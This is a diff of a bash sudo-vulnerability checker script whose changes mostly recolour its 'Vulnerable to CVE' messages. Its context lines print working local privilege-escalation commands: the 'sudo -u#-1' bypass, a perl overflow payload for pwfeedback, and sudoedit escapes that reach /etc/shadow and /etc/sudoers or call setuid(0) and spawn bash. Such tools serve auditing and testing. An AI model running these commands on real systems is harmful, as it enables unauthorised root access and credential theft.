@@ -385,7 +385,7 @@ checkcve()
   
  echo -e "${BOLD}${YELLOW}============= Checking for disclosed vulnerabilities (CVE) =================== ${RESET} \n"
  echo -e "${BOLD}${GREEN}[+] The prerequisite for the below CVEs have been checked (not all CVEs checked - refer to readme).:${RESET}" 
- echo -e "${BOLD}${RED}[+] Highly probable that sudo is VULNERABLE to the below CVEs.:${RESET}" 
+ echo -e "${BOLD}${RED}[+] Highly probable that sudo is VULNERABLE to the below CVEs.:${RESET} \n" 
  
   ##### CVE-2015-5602
 ##### The bug was found in sudoedit, which does not check the full path if a wildcard is used twice (e.g. /home/*/*/esc.txt), 
@@ -396,7 +396,7 @@ sudodblwildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD: sudoedit" | g
 if [ "$sudodblwildcard" ]; then
   echo -e "${BOLD}${GREEN}[+] Sudoedit with double wildcard was detected (CVE-2015-5602): ${RESET}" 
   echo -e "$sudodblwildcard"
-  echo -e "[-] Vulnerable to CVE-2015-5602"
+  echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2015-5602${RESET}"
   echo -e "[-] current $sudover | vuln version: <=1.8.14"  
   echo -e "[*] Exploit: /exploits/CVE-2015-5602.sh"  
   echo -e "\n" 
@@ -410,7 +410,7 @@ sudorunas=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)")
 if [ "$sudorunas" ]; then
   cmdi=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)" | sed 's/NOPASSWD//g' | sed 's/://g' | cut -d ")" -f 2)
   echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-14287: ${RESET}"
-  echo -e "[-] Vulnerable to CVE-2019-14287"
+  echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2019-14287${RESET}"
   echo -e "[-] current $sudover | vuln version: <=1.8.27"
   echo -e "[-] Example : sudo -u#-1 /usr/bin/id"  
   echo -e "[-] Run command : sudo -u#-1 <cmd>"
@@ -426,7 +426,7 @@ if [ "$cnver" -lt "1008026" ] && [ "$cnver" -gt "1007001" ] ; then
 sudopwfeedback=$(echo "$cmd" 2>/dev/null | grep " pwfeedback")
 if [ "$sudopwfeedback" ]; then
   echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-18634: ${RESET}"
-  echo -e "[-] Vulnerable to CVE-2019-18634" 
+  echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2019-18634${RESET}" 
   echo -e "[-] current $sudover | vuln version: 1.7.1 to 1.8.25p1 inclusive"
 # echo -e "[-] Run command : perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id"
   echo -e "[-] Run command : perl -e 'print((\"A\" x 100 . \"\\x{00}\") x 50)' | sudo -S id"
@@ -447,6 +447,7 @@ if [ "$check_psymlinks" ]; then
   echo -e "[-] Provided that SELinux is in permissive (not enforcing or disables) mode (Refer to the file  /etc/selinux/) "
   echo "or the invoking user is in an unconfined domain, then only all requirements will be met for exploitation."
   echo "Permissive mode: SELinux prints warnings instead of enforcing."
+  echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2021-23240${RESET}"
   echo -e "[*] M1 : Run command: sudoedit /path then :e /etc/sudoers or :e /etc/shadow"  
   echo -e "[*] M2 : Run command: S1 -> sudoedit /path then :call libcallnr("libc.so.6","setuid",0)"
   echo -e " S2 -> then run ::!bash"
@@ -484,7 +485,9 @@ if [ "$sudoeditrockchk" ]; then
    #sudo_escape=$(sudoedit -s / | grep "sudoedit:")
    #sudo_escape=$("sudoedit -s /")
    #if [ "$sudo_escape" ]; then
-    echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2023-22809 ${RESET}"
+    echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2023-22809${RESET}"
+    echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
+    
     #echo -e "[*] Run command: "
     echo -e "[*] Notes: /exploits/CVE-2023-22809.txt"
     #echo -e "[*] Exploit: "
